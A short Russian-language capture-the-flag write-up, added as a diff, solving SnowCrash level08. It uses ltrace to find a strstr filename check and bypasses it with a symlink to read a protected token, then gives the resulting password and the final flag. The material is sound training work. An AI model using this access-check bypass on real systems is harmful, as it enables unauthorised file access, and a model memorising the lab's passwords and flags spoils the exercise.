@@ -1,0 +1,43 @@
+1) Видим подозрительные файлы level08 и token
+./level08 [file to read] - если запустить скрипт
+cat: token: Permission denied - нельзя посмотреть что там внутри.
+
+2) Посмотрим какие функции скрипт вызывает с помощью ltrace:
+__libc_start_main(0x8048554, 1, 0xbffff7e4, 0x80486b0, 0x8048720 <unfinished ...>
+printf("%s [file to read]\n", "./level08"./level08 [file to read]
+)                                     = 25
+exit(1 <unfinished ...>
++++ exited (status 1) +++
+
+3) Вроде всё просто попробуем туда закинуть файл token.
+./level08 token 
+You may not access 'token'
+
+4) Посмотрим ltrace теперь с аргументом token:
+
+./level08 token 
+You may not access 'token'
+level08@SnowCrash:~$ ltrace ./level08 token
+__libc_start_main(0x8048554, 2, 0xbffff7d4, 0x80486b0, 0x8048720 <unfinished ...>
+strstr("token", "token")                                                       = "token"
+printf("You may not access '%s'\n", "token"You may not access 'token'
+)                                   = 27
+exit(1 <unfinished ...>
++++ exited (status 1) +++
+
+5) Видно, что если у нас название совпадает с token, то тогда мы не сможем выполнить программу. Поменяем имя:
+mv token umoff  - не работает
+chmod 777 token  - не работает
+Скопировать на мак тоже не вышло.
+Попробуем сделать ссылку и поменять называние: 
+ln -s ~/token /tmp/tkn
+
+6) ./level08 /tmp/tkn
+quif5eloekouj29ke0vouxean
+
+7) А вот нет, не работает. 
+8) su flag08 + quif5eloekouj29ke0vouxean
+9) getflag
+Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
+
+Ответ: 25749xKZ8L7DkSCwJkT9dyv6f
